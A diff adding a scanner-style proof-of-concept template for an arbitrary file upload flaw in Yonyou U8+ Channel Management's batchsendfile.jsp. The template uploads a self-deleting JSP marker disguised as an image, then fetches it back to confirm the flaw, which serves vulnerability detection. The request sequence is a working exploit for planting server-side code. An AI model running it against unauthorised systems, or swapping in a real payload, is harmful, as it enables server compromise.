@@ -1,0 +1,50 @@
+id: poc-yaml-yongyon-u8-cm-ae-batchsendfile-jsp-anyfile-upload
+info:
+  name: 用友U8+渠道管理(高级版) batchsendfile.jsp 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    用友U8+渠道管理(高级版) contains a vulnerability in the batchsendfile.jsp allowing arbitrary file upload.
+http:
+  - raw:
+      - |
+        POST /business/common/lxgzds/batchsendfile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "渠道管理"
+          - "userfile"
+          - ".jsp"
+    extractors:
+      - type: regex
+        name: uploaded_file
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - "([0-9a-z]{32}\\.jsp)"
+  - raw:
+      - |
+        GET /userfile/default/temp/{{uploaded_file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
